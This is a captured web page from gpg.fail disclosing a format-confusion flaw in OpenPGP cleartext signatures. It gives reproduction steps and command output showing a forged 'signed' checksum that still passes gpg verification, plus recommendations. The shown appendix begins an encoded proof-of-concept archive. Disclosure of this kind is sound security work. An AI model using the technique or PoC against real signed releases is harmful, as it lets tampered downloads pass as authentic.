/a></footer><!----><!--]--> <!--[!--><!--]--><!--]--><script data-cfasync=
=3D"false" src=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.=
min.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="08-notsoclear.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>OpenPGP Cleartext Signature Framework Susceptible to Format Confusion</h1>=
 <!----><p>An attacker can exploit ambiguous <em>OpenPGP</em> format syntax=
 to deceive users into misinterpreting an ASCII-armored <a href=3D"https://=
www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-messages" rel=3D"nofollow"=
>One-Pass Signed Message</a> as a <a href=3D"https://www.rfc-editor.org/rfc=
/rfc9580.html#section-7" rel=3D"nofollow">Cleartext Signature Framework</a>=
 message through a malformed header.</p> <h2>Impact</h2> <p>This format con=
fusion enables substitution of the original signed data with malicious cont=
ent while retaining a seemingly valid cryptographic verification.
Users and automated checks may unknowingly accept altered or spoofed payloa=
ds as authentic, because popular PGP implementations, such as <em>GnuPG</em=
>, default to not explicitly displaying the actual data bound by the signat=
ure during validation.</p> <p>Despite <a href=3D"https://www.rfc-editor.org=
/rfc/rfc9580.html#name-issues-with-the-cleartext-s" rel=3D"nofollow">docume=
nted issues</a> with the <em>Cleartext Signature Framework</em> and <em>Gnu=
PG</em> <a href=3D"https://www.gnupg.org/documentation/manuals/gnupg/Operat=
ional-GPG-Commands.html#:~:text=3DIt%20is%20suggested%20to%20avoid%20cleart=
ext%20signatures%20in%20favor%20of%20detached%20signatures." rel=3D"nofollo=
w">recommending against it</a>, usage of cleartext signatures remains preva=
lent.</p> <p>The attack necessitates a valid <em>OpenPGP</em> signature app=
lied to known, but non-chosen, arbitrary data.</p> <h2>Details</h2> <p>The =
attack is to disguise a <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.h=
tml#name-openpgp-messages" rel=3D"nofollow">One-Pass Signed Message</a> (e.=
g. created through <code>gpg --sign</code>) as a <a href=3D"https://www.rfc=
-editor.org/rfc/rfc9580.html#name-cleartext-signature-framewo" rel=3D"nofol=
low">Cleartext Signature Framework</a> message (<code>gpg --clearsign</code=
>)</p> <p>The <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html" rel=
=3D"nofollow">RFC 9580</a> mandates, that a <em>One-Pass Signed Message</em=
> encompasses the following packets:</p> <ul><li>a <a href=3D"https://www.r=
fc-editor.org/rfc/rfc9580.html#name-one-pass-signature-packet-t" rel=3D"nof=
ollow">One-Pass Signature Packet</a>: Unprotected metadata, including: <ul>=
<li>Hash algorithm,</li> <li>Public key algorithm,</li> <li>Short key-id of=
 the signing key.</li></ul></li> <li>a <a href=3D"https://www.rfc-editor.or=
g/rfc/rfc9580.html#name-literal-data-packet-type-id" rel=3D"nofollow">Liter=
al Data Packet</a>: The signed data.</li> <li>a <a href=3D"https://www.rfc-=
editor.org/rfc/rfc9580.html#name-signature-packet-type-id-2" rel=3D"nofollo=
w">Signature Packet</a>: A binding between some public key and some data.</=
li></ul> <p>Any <em>OpenPGP</em> signature format containing a valid <a hre=
f=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-signature-packet-type=
-id-2" rel=3D"nofollow">Signature Packet</a> alongside the signed data, suc=
h as the <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-cleart=
ext-signature-framewo" rel=3D"nofollow">Cleartext Signature Framework</a>, =
can be converted to a <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.htm=
l#name-openpgp-messages" rel=3D"nofollow">One-Pass Signed Message</a> throu=
gh:</p> <ul><li>forgery of a <a href=3D"https://www.rfc-editor.org/rfc/rfc9=
580.html#name-one-pass-signature-packet-t" rel=3D"nofollow">One-Pass Signat=
ure Packet</a> (contains no cryptographically protected contents), and</li>=
 <li>encoding of the signed data in a <a href=3D"https://www.rfc-editor.org=
/rfc/rfc9580.html#name-literal-data-packet-type-id" rel=3D"nofollow">Litera=
l Data Packet</a>, and</li> <li>copying the <a href=3D"https://www.rfc-edit=
or.org/rfc/rfc9580.html#name-signature-packet-type-id-2" rel=3D"nofollow">S=
ignature Packet</a>.</li></ul> <p>Since the conversion preserves both the s=
igned data and the signature, cryptographic integrity remains intact. Keyin=
g material - neither private nor public - is not required to conduct the co=
nversion, and a <em>Python</em> script for this procedure is provided in th=
e appendix as a proof of concept.</p> <p>The attack leverages the ambiguity=
 of the <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-armor-h=
eader-line" rel=3D"nofollow">OpenPGP Armor Header Line</a>, which allows a =
<a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-message=
s" rel=3D"nofollow">One-Pass Signed Message</a> to be wrapped by <code>BEGI=
N PGP MESSAGE</code> or <code>BEGIN PGP SIGNATURE</code>.</p> <p>Additional=
ly, the <em>OpenPGP</em> specifically does not mandate a particular handlin=
g of non-whitespace characters preceding or following an ASCII-armored <em>=
OpenPGP</em> message.</p> <p>A recipient of an OpenPGP signature might be d=
eceived by an adversary through a malformed <a href=3D"https://www.rfc-edit=
or.org/rfc/rfc9580.html#name-armor-header-line" rel=3D"nofollow">Armor Head=
er Line</a> into incorrectly assuming the <a href=3D"https://www.rfc-editor=
.org/rfc/rfc9580.html#name-cleartext-signature-framewo" rel=3D"nofollow">Cl=
eartext Signature Framework</a> was used. This allows for stuffing arbitrar=
y data, that the user incorrectly believes to be signed.</p> <p>The <em>Ope=
nPGP</em> specifically does not mandate a particular handling of non-whites=
pace characters preceding or following an ASCII-armored <em>OpenPGP</em> me=
ssage. Common OpenPGP implementations silently discard any superfluous data=
 preceding the <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-=
openpgp-messages" rel=3D"nofollow">One-Pass Signed Message</a> including ma=
lformed <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-armor-h=
eader-line" rel=3D"nofollow">Armor Header Lines</a>. The <a href=3D"https:/=
/www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-messages" rel=3D"nofollow=
">One-Pass Signed Message</a> subsequently passes cryptographic validation.=
 By default <em>GnuPG</em> does not output the signed data during validatio=
n, which further helps in deceiving the user.</p> <h3>Detailed steps to rep=
roduce</h3> <h4>Scenario</h4> <p>Alice wants to transmit a file (<code>UwUn=
tu.iso</code>) to Bob. Alice wants to assert her authorship and prevent man=
ipulations to the file. Alice has created an OpenPGP keypair and securely t=
ransferred her public key to Bob.</p> <p>Mallory is a threat actor able to =
intercept and manipulate communications between Alice and Bob. Her goal is =
to replace the legitimate file (<code>UwUntu.iso</code>) through her malici=
ous one (<code>EnterpriseLinux.iso</code>) while seemingly preserving valid=
 cryptographic verification.</p> <p><code>UwUntu.iso</code> and <code>Enter=
priseLinux.iso</code> differ in their contents and thus their SHA256 checks=
ums.</p> <p>Mallory possesses neither private nor public keying material us=
ed by Alice.</p> <p>Mallory did not interfere with the initial key exchange=
 between Alice and Bob.</p> <h4>Procedure</h4> <p>Alice decides to clearsig=
n the <em>SHA256</em> checksum of <code>UwUntu.iso</code>:</p> <p><code>sha=
256sum --status UwUntu.iso --tag | gpg --clearsign --local-user <a href=3D"=
/cdn-cgi/l/email-protection" class=3D"__cf_email__" data-cfemail=3D"85e4e9e=
ce6e0c5e0fde4e8f5e9e0abeaf7e2">[email&#160;protected]</a> --armor | tee UwU=
ntu.iso-CHECKSUM</code></p> <!----><pre class=3D"shiki github-dark-default"=
 style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><spa=
n class=3D"line"><span>-----BEGIN PGP SIGNED MESSAGE-----</span></span>
<span class=3D"line"><span>Hash: SHA512</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>SHA256 (UwUntu.iso) =3D e3b0c44298fc1c149afbf4c8=
996fb92427ae41e4649b934ca495991b7852b855</span></span>
<span class=3D"line"><span>-----BEGIN PGP SIGNATURE-----</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>iHUEARYKAB0WIQToHhAB/IMVCMWsfO8A2ANj0QlJcwUCaGqR=
4AAKCRAA2ANj0QlJ</span></span>
<span class=3D"line"><span>c0I9AP4qiHxx+D90OGDEGFcdSkjiUSD/fLhlYoVDiHhnPSzH=
bwEAuyUxrYYg23kA</span></span>
<span class=3D"line"><span>VHK9nCInS1fNKbWo8NiedYVOXnISOgs=3D</span></span>
<span class=3D"line"><span>=3Da6YF</span></span>
<span class=3D"line"><span>-----END PGP SIGNATURE-----</span></span></code>=
</pre><!----> <p>Alice then starts transmission of <code>UwUntu.iso</code> =
and <code>UwUntu.iso-CHECKSUM</code> to Bob.</p> <p>Mallory intercepts this=
 transmission.
She then converts the <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.htm=
l#name-cleartext-signature-framewo" rel=3D"nofollow">Cleartext Signature</a=
> to a <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-=
messages" rel=3D"nofollow">One-Pass Signed Message</a>, that she disguises =
as a <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-cleartext-=
signature-framewo" rel=3D"nofollow">Cleartext Signature</a>:</p> <!----><pr=
e class=3D"shiki github-dark-default" style=3D"background-color:#0d1117;col=
or:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:=
#FFA657">$</span><span style=3D"color:#A5D6FF"> python</span><span style=3D=
"color:#A5D6FF"> fake-signature/main.py</span><span style=3D"color:#A5D6FF"=
> ./UwUntu.iso-CHECKSUM</span><span style=3D"color:#A5D6FF"> /dev/stdout</s=
pan></span>
<span class=3D"line"><span style=3D"color:#FFA657">-----BEGIN</span><span s=
tyle=3D"color:#A5D6FF"> PGP</span><span style=3D"color:#A5D6FF"> SIGNED</sp=
an><span style=3D"color:#A5D6FF"> MESSAGE------</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">Hash:</span><span style=
=3D"color:#A5D6FF"> SHA512</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">&#x3C;</span><span style=
=3D"color:#E6EDF3">insert your message here</span><span style=3D"color:#FF7=
B72">></span></span>
<span class=3D"line"><span style=3D"color:#FFA657">-----BEGIN</span><span s=
tyle=3D"color:#A5D6FF"> PGP</span><span style=3D"color:#A5D6FF"> SIGNATURE-=
----</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">kA0DAQoWANgDY9EJSXMBrFx0=
AGhqkeBTSEEyNTYgKFV3VW50dS5pc28pID0gZTNi</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">MGM0NDI5OGZjMWMxNDlhZmJm=
NGM4OTk2ZmI5MjQyN2FlNDFlNDY0OWI5MzRjYTQ5</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">NTk5MWI3ODUyYjg1NYh1BAEW=
CgAdFiEE6B4QAfyDFQjFrHzvANgDY9EJSXMFAmhq</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">keAACgkQANgDY9EJSXNCPQD+=
Koh8cfg/dDhgxBhXHUpI4lEg/3y4ZWKFQ4h4Zz0s</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">x28BALslMa2GINt5AFRyvZwi=
J0tXzSm1qPDYnnWFTl5yEjoL</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">=3D//2u</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">-----END</span><span sty=
le=3D"color:#A5D6FF"> PGP</span><span style=3D"color:#A5D6FF"> SIGNATURE---=
--</span></span></code></pre><!----> <p>Mallory replaces <code>&lt;insert y=
our message here></code> with the checksum tag of her malicious <code>Enter=
priseLinux.iso</code>:</p> <!----><pre class=3D"shiki github-dark-default" =
style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span=
 class=3D"line"><span>-----BEGIN PGP SIGNED MESSAGE------</span></span>
<span class=3D"line"><span>Hash: SHA512</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>SHA256 (UwUntu.iso) =3D 62545c1551bcc06a72163775=
203d9163f46e47930cd024b4df270afa11a57ba9</span></span>
<span class=3D"line"><span>-----BEGIN PGP SIGNATURE-----</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>kA0DAQoWANgDY9EJSXMBrFx0AGhqkeBTSEEyNTYgKFV3VW50=
dS5pc28pID0gZTNi</span></span>
<span class=3D"line"><span>MGM0NDI5OGZjMWMxNDlhZmJmNGM4OTk2ZmI5MjQyN2FlNDFl=
NDY0OWI5MzRjYTQ5</span></span>
<span class=3D"line"><span>NTk5MWI3ODUyYjg1NYh1BAEWCgAdFiEE6B4QAfyDFQjFrHzv=
ANgDY9EJSXMFAmhq</span></span>
<span class=3D"line"><span>keAACgkQANgDY9EJSXNCPQD+Koh8cfg/dDhgxBhXHUpI4lEg=
/3y4ZWKFQ4h4Zz0s</span></span>
<span class=3D"line"><span>x28BALslMa2GINt5AFRyvZwiJ0tXzSm1qPDYnnWFTl5yEjoL=
</span></span>
<span class=3D"line"><span>=3D//2u</span></span>
<span class=3D"line"><span>-----END PGP SIGNATURE-----</span></span></code>=
</pre><!----> <p>Mallory replaces the contents of <code>UwUntu.iso</code> w=
ith those of <code>EnterpriseLinux.iso</code>.</p> <p>Having modified both =
<code>UwUntu.iso</code> and the signature <code>UwUntu.iso-CHECKSUM</code>,=
 Mallory forwards the files to Bob.</p> <p>Bob verifies the signature:</p> =
<!----><pre class=3D"shiki github-dark-default" style=3D"background-color:#=
0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span style=
=3D"color:#FFA657">$</span><span style=3D"color:#A5D6FF"> cat</span><span s=
tyle=3D"color:#A5D6FF"> ./UwUntu.iso-CHECKSUM</span><span style=3D"color:#F=
F7B72"> |</span><span style=3D"color:#FFA657"> gpg</span><span style=3D"col=
or:#79C0FF"> --verify</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> Signature</span><span style=3D"color:#A5D6FF"> made</sp=
an><span style=3D"color:#A5D6FF"> Sun</span><span style=3D"color:#A5D6FF"> =
Jul</span><span style=3D"color:#79C0FF">  6</span><span style=3D"color:#A5D=
6FF"> 17:10:24</span><span style=3D"color:#79C0FF"> 2025</span><span style=
=3D"color:#A5D6FF"> CEST</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF">                using</span><span style=3D"color:#A5D6FF=
"> EDDSA</span><span style=3D"color:#A5D6FF"> key</span><span style=3D"colo=
r:#A5D6FF"> E81E1001FC831508C5AC7CEF00D80363D1094973</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> Good</span><span style=3D"color:#A5D6FF"> signature</sp=
an><span style=3D"color:#A5D6FF"> from</span><span style=3D"color:#A5D6FF">=
 "Alice &#x3C;<a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__=
" data-cfemail=3D"ea8b8683898faa8f928b879a868fc485988d">[email&#160;protect=
ed]</a>>"</span><span style=3D"color:#E6EDF3"> [ultimate]</span></span></co=
de></pre><!----> <p>Confident over the legitimacy of <code>UwUntu.iso-CHECK=
SUM</code>, Bob verifies, that <code>UwUntu.iso</code> actually matches <co=
de>UwUntu.iso-CHECKSUM</code>:</p> <p><code>sha256sum --check UwUntu.iso-CH=
ECKSUM</code></p> <!----><pre class=3D"shiki github-dark-default" style=3D"=
background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D=
"line"><span>UwUntu.iso: OK</span></span></code></pre><!----> <p>Mallory=E2=
=80=99s attack succeeded, as she deceived Bob into believing the manipulate=
d <code>UwUntu.iso</code> to be cryptographically signed by Alice.</p> <p>T=
he verification process involving cleartext signatures and SHA256 checksums=
 is utilized by multiple well-known software distributions and exists beyon=
d the scope of this theoretical example.</p> <h2>Recommendations</h2> <p>Re=
moval of the Cleartext Signature Framework from the <em>OpenPGP</em> standa=
rd helps resolve the <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html=
#name-issues-with-the-cleartext-s" rel=3D"nofollow">issues with the Clearte=
xt Signature Framework</a>. Furthermore, deprecation allows for a graceful =
phase-out.</p> <p><em>OpenPGP</em> users should avoid using cleartext signa=
tures, as is also recommended by <em>GnuPG</em>.</p> <p>To prevent confusio=
n about the actual signed data, <em>OpenPGP</em> implementations should out=
put the data bound by the signature during validation by default. <em>sequo=
ia-sq</em> does so. <em>GnuPG</em> does not and requires the <code>--output=
</code> option to be set.</p> <p>When working with <em>OpenPGP</em> signatu=
res in general, users should instruct their PGP implementation to output th=
e signed data and only use this output for any further or related tasks.</p=
> <h2>Credits</h2> <ul><li>Finder credits: 49016</li> <li>PoC &amp; writeup=
: 49016, Fl=C3=BCpke, Sivizius, Liam</li></ul> <h2>Appendix</h2> <h3>fake-s=
ignature.tar.xz.b64</h3> <!----><pre class=3D"shiki github-dark-default" st=
yle=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span c=
lass=3D"line"><span>/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4Mn/GdtdADMYSbfbQ7sPbJB=
5BjrVKn15CCE9iBb/xf8/</span></span>
<span class=3D"line"><span>yON3fDn0hjSHJ6qIbYOW0iQZCvp6I54h6JBCJhzOzVx75gts=
d9cLSYkOyuY9E9OKD7ZZMaWk60X3</span></span>
<span class=3D"line"><span>ARptB+OOI0veIsuHADAwPbirscsQCAM+K/uC1pM//FCuwQxd=
YLNb428juqdQPsKtSGsqUGf1kSCV</span></span>
<span class=3D"line"><span>s9eddvQzy1qb4VF2QOnE9wy04S+VgZQ2+4UrfW18bz+OByw3=
/Xei9gAws3Dgrp0qjhJJVbmALNSw</span></span>
<span class=3D"line"><span>KrbPtsOkA+DP+Yf+EnRiiplT3RQ8Mn4RX/HLVHeonP37lHuh=
YJj1u3xWrs9tp/5XYGvMfIjBRAaI</span></span>
<span class=3D"line"><span>OWf49rSMKAuRePifflxgZ1eH9TorrlB/k1zgpt3SQB0fu/bD=
MjT5nQsl4YvLwQRsrswWdYqBV7o8</span></span>
<span class=3D"line"><span>b83l35O0uP4QXWf8SBJDu2sMRY0Ea8YKfH96VD0oPxUN3Ax4=
hkhjaQZaq/wcAAuNbUK9Vwp/H1G9</span></span>
<span class=3D"line"><span>E3NleVwxw2HxM9s/cbsWXQyCLjGpbW0smEnjoLNRCkTzRuBz=
e4BjFagL3jXfOLc5+9FOy3Q/G+Kg</span></span>
<span class=3D"line"><span>O+ae0ycKrbI2GPhVyfBtTHWt9Aphe43lNdPbxJ+pNP36TL1y=
lP1ve676ZldCGQhz+/ve1mbZKOQj</span></span>
<span class=3D"line"><span>U70JJqIQEuxfQfv1qDQ0xrUvlfCwYVLnJ4T2teHXCsiivmgd=
Yp1QLRypD1Q8fXFGkg/S77KD4yOR</span></span>
<span class=3D"line"><span>tdHgCNcpwoDktSPrTjeYwcdfW1j6xoBYfVzn3D797FUorU61=
rNywlshN7ihyXZmmNsEOvvr9d0u7</span></span>
<span class=3D"line"><span>lZUzWktGqYde9wovdLrYLcSkESUE7fusoI7PLM6QVfVPvK/C=
aea4jesS5Dye7V2sIOCR3sFNHCSD</span></span>
<span class=3D"line"><span>TO5Cmv+kXL9vjnxhNigToQ8MaXe0ro4IV2bR4O7CO7E3XWwx=
YOCKiTQp2WFJ/WoPcVcNAh1yDVsx</span></span>
<span class=3D"line"><span>UiVnE3t7kpjx2b9m75jLKTxW8yrCB7adIEycMZqYZNejgCOu=
yRcxeE79iGc4u1DLbiLgHsiqdbxr</span></span>
<span class=3D"line"><span>IFtohozjhHLZBWO+nbps56sKYluMMS1jDiPySc1lG2lHZSjM=
EItheYJj2alNWTNHc6/N9A+yYOxd</span></span>
<span class=3D"line"><span>wYWXfuhlgtFZP15xsY4mqwU7vN+u21McM1WjPe8mPWw+Pnfh=
Bqz5l/465ztwOAvFmk91EDle0/sL</span></span>
<span class=3D"line"><span>3gl8V4vKNweQNoBbizQs2wJIEqIup/fMQqn3meo0evKoDTD7=
IPHPLDswEvluF/6mbKee4k0Xk73h</span></span>
<span class=3D"line"><span>5ffcUhH+6dhTXfff7av8bWMOH4WDFBAYhydVNVuzQV2Yn1/m=
DJaaTXkILWgZWYWdaBZ/YDm0pUV5</span></span>
<span class=3D"line"><span>tmotp6qpeynJ5AAoZv2SzC/7LxVsSa9exyhAnvFq7BHM7OF4=
9bk0pD5hU8w5Pzy642Nnh1Ndjbqv</span></span>
<span class=3D"line"><span>GGXBZX23EwGWA2qkGfdbbbr5eIp4H6t/HXkbhW2DkiernqDB=
d1dX77Y66bgS6k5FlLsu/NBM544j</span></span>
<span class=3D"line"><span>R+lvMJi2aXRzZcDKI/pSfEL6fOJBU99UV0+2gmSoEI5Y4CFr=
eZOIo5lSCVwr5a0hpu+nyOFVIByd</span></span>
<span class=3D"line"><span>RpMYXqtxkP8ieVTtMI8TkvvHmTDF+EEp8FlxMaeea8DPGbjr=
HumsEFDiGb/rFBB8Y0Z0Hmq1KCIZ</span></span>
<span class=3D"line"><span>vI8/HGcd7uN1BXyaY5s33+hQm5xf4t/hJx1ZY9RaOdq2RKzg=
8mblIXh999sdlMuRnFu+c3ZwXxG5</span></span>
<span class=3D"line"><span>iTkmIVOgY2lwZO1m+qfIEjquZpPvexGe9w4eVN49kJ5bgJj4=
kezgIwkMJFaCRTRIP2EqVrISv+mx</span></span>
<span class=3D"line"><span>lt6T8WOp1i7wq6BTdxJ2cGmZNBKvc1hZZRPE6U5ymKKxSu11=
vFlRq1T9+fgNX7cD4KaVOPr6fom5</span></span>
<span class=3D"line"><span>6FrQUTZmPWdSATFAPh84TJJy9v0gtSvH7SW8uFWJSjDPFhVX=
/bt4ylENJK1ubERDd4zGT10IcxWn</span></span>
<span class=3D"line"><span>XhIFK8bL64oZyhJ8mofq8qhK2xDy9Nh6gZlh3q0UIvt1dtIp=
MrrMThFmpVRD0pQe1AA4pJcKaVO0</span></span>
<span class=3D"line"><span>4CS7JZnvuRuLE9h5zgM+e6NZ/sB59TsUgSaWKJCkn1I7qD3H=
IMMRBT2JH6W7v89z8OX85wYg6u6t</span></span>
<span class=3D"line"><span>neBQUEN+rSy5CYt3+XYDCbZ4QXXnNLuysWIlvh0y73rf9pzC=
wLHme/WzRguFFzp6COYBe+6Bcet7</span></span>
<span class=3D"line"><span>1bXScMcXHTv/VVt1VdASKEu1c44nNgFBj96lmWHJgk6igzdf=
qLyeVk3Wc4TeshUcA1Nkiz05KaG4</span></span>
<span class=3D"line"><span>FbMl/vMiLLJYbQG8bHWqEnj1NDsQQ5zSt6kfGZIiUcTJITxq=
XpbGqT+2nSZkYTvF+oDKu2pWgDa+</span></span>
<span class=3D"line"><span>+GUrI28O9z+8XEy7Q5NiWp87cLfAmePulxEYgGUw5PwXYH4p=
mvXTgkVh3lUTUMEglYPcXL1S39IE</span></span>
<span class=3D"line"><span>ygalVYwkXonUIEaRaKf5LSFLGBjudL8MPVeEJEoqa71XZ+tZ=
tlDIq7/Jndmcbcd8RfGpC7EetRyI</span></span>
<span class=3D"line"><span>lEV1F+Sy+e+w0cJrpV5BiHgdEo7bspAlrvthO0JBKsZXN4Sw=
7xvPLJL5CP8twXn3+a7Do+TxG0Xq</span></span>
<span class=3D"line"><span>vkmJvZn9dpesjiqZM+5/57O/yWnAS32+9fnAr+9BOuVYTP/Y=
lSYHRY1mxwbQaot38tMsjvAilEx0</span></span>
<span class=3D"line"><span>14fHauL0ZuZtE3sMbbwf42K0S7wRnoc55M+vc1qNssYOiLDe=
pFRX4MpH8jsIwNh5xcE7VKXj6SGO</span></span>
<span class=3D"line"><span>StwVyyt630yL7BilZ99T1Lozmb8ikqsybRLSnmTFmAeH+a1m=
DXHCDgognUjbg8KzZUsLUKpEsqWZ</span></span>
<span class=3D"line"><span>dRF1HITKJFCn0VxpNv/Lid7AKfh3QbXZkIoe/y972Une7WvR=
tX9iyfHOOGHhNL7gJLt7c7T1fAym</span></span>
<span class=3D"line"><span>C3HTccJ7t8hBfed1PPknLp1k/mixiDSXJ7txviXKN1BWmf5W=
APYkTyJ0qGSnciVZNd96aHyKsyFO</span></span>
<span class=3D"line"><span>i9H5hpFEB107cedCf4gOpzZSvOeC9FBX538/QtzbwkY7A5FU=
t7X0rP+VAG/SdJLXaV3eVtWWD8fV</span></span>
<span class=3D"line"><span>RMvxG1vvdO74j3SW1HHfRz0yyXQ3lvtCjIa7Xccu/oa/+kik=
Vsy6hUE/YUQMkLuOuC0ZxKNTFatO</span></span>
<span class=3D"line"><span>KhuK/WfEAD3vJfby9H5J/fGI8QdalEtNECmurFpv7VGBV4pz=
YuhihTNlr/axvivl21qk/tTTK4Lr</span></span>
<span class=3D"line"><span>lF4/7+IQfp/qPidl7Vad90HVMPrEw5pIVPBWnMBd79RAW7rO=
DSMjX0ggkCgtDpYpVr9ft5WJTzWQ</span></span>
<span class=3D"line"><span>/qR7+sXeuRJVt4KQJXn0kTNCPsq09AxSuGQdIA9z+quuAqvN=
FYqaMkGJRv1ezc2kcpAVkQ5J9/ts</span></span>
<span class=3D"line"><span>bdxOqMOSDGs+Qzuugzp19l1Sr4Rr6GoPo7vVCgM0h1Rk67hV=
UHyLBzz4j0DS3R3in4DVredd0ZYv</span></span>
<span class=3D"line"><span>oSr6cinZY61UVi/8NidMHoBOCYc3nocGSvYv0/EERku1j5/p=
ndyba14H6KR+JhlXNUOvHePtoPBQ</span></span>
<span class=3D"line"><span>0nOLo96adxaD7e1ARo/HAWEPSsWXGe/AnxaQ6WWO8/oKqpXj=
ECpZRczyx/lkeiCn3IbbjMAOjm6v</span></span>
<span class=3D"line"><span>uapopSxsOHoiZ4QCy3OrbELCN9JHamvOmoWfuiLakOD0MApN=
ucDCDpO/IKG8crVTtnFj7O2tp5tT</span></span>
<span class=3D"line"><span>hX6t/M+i2mwlZejTj+mTBaRBZnx0ZRTxRQl5Bq1hSnHHKpuX=
ZwQ+1MWpjIxLgMZta7Ia5eRnYOtk</span></span>
<span class=3D"line"><span>BpS1ujcKEMqegrzsoWMoGCc4JoW/+PnyGsCYO1HxdMIBdX1S=
83cbJoIYeXOn6LG2tqLWFvBN5KC/</span></span>
<span class=3D"line"><span>w2LsfZdpXW+SuIFd22Te+Rflp0oB1H2hXTmN4bU0uM5tgE+H=
mTL65F1I/8nX6pp+x0bab8Dk7IGC</span></span>
<span class=3D"line"><span>j6WXH/2GSBDoSwpcPv840NnMmXrGfzkbK1YG+4w+KRClJV5Z=
iawDmaFb/oVVlhoZEHkHBf1BKhQq</span></span>
<span class=3D"line"><span>QKHT62JxOvzjHhVv8pCNblqcqMnt/OfRs5NwmI6/EaPNL48z=
Zz56Hew02dngGwA1h9f4okGq4aYA</span></span>
<span class=3D"line"><span>bGo0eFYrxrreXvYSt3bIg2luJ/J9rMtt1w8HiC2phzOQZNrC=
BDn8wsgBDFmE1JOayVm7SOaVRX9j</span></span>
<span class=3D"line"><span>3gSPIQYlCCYsGDzvrPLTfMj+LD5UoMGbHJTlFdNKf/sAjrD3=
+bMrgJIYfRwjB4Y3jjPMgProUBL8</span></span>
<span class=3D"line"><span>UqUK4bhrBaRwOUJpTGP/SDJAYtn7C+2I13Tba3cUnDahu3M6=
ajzaYyppolT81wUgPQFHDhvE7H4I</span></span>
<span class=3D"line"><span>w3XBic+VckydnrSoFAZmyiMqKfHB7naQSAFE+n5okl+rrsGu=
PhQI0XSjCjbxMMlKJE2s0atr/sK6</span></span>
<span class=3D"line"><span>34SabbmUJz4d175+V3fprnmjc8FjVZHonWQjqfukSyXOD4e2=
JbO7BvUusp3vf51FcbQg7tIyIdi9</span></span>
<span class=3D"line"><span>2QrNlYhWx53HERzhg9kEhFW8FUiqdEnVE63pAbY2wTHrvQCb=
ZEB+bVgk8LnHgBi86/x2rnJ46nYY</span></span>
<span class=3D"line"><span>V/o5M4ZokctxoRBFuHfaJPF4emWB03CLERuLbF+T/35CaTY1=
aizsGfiFF53Np2FIbhYh3taihAGu</span></span>
<span class=3D"line"><span>ZsDFyetv2GdJ4mX624a/YvZEdktTTqaaztlALvhl3iO4sdy1=
rKWkz19ziNkU1LQGJ88diJHhqbwW</span></span>
<span class=3D"line"><span>3tlzcNr0DCG7rbTnYsONlKLLBTHBw1TpO3GaUyTLD8wT0/cZ=
uFKtG+KQ71GD6DO9hvv0s4bC5SPW</span></span>
<span class=3D"line"><span>dF+6Gp9eZSh76YtDUm/sYtr6wYX4AHHaI0PRO1QaCbUnnVGa=
dCJ8ZVM1qXuWSa1/SPSq2KgpBBg5</span></span>
<span class=3D"line"><span>UY2eh8TyypBo7opF7iPJx8adzSn87sdZ0vCRR7kkmpP5Ww/R=
/QpLVB/tYV/dGhQJjD/SCk99/iVz</span></span>
<span class=3D"line"><span>L1p8IPEaDtMsiQLBojEP7f69HHBWxW1XjIC7jSh96shcIFTo=
qaoZJwBOET5EFllG+HmZaw82D7OL</span></span>
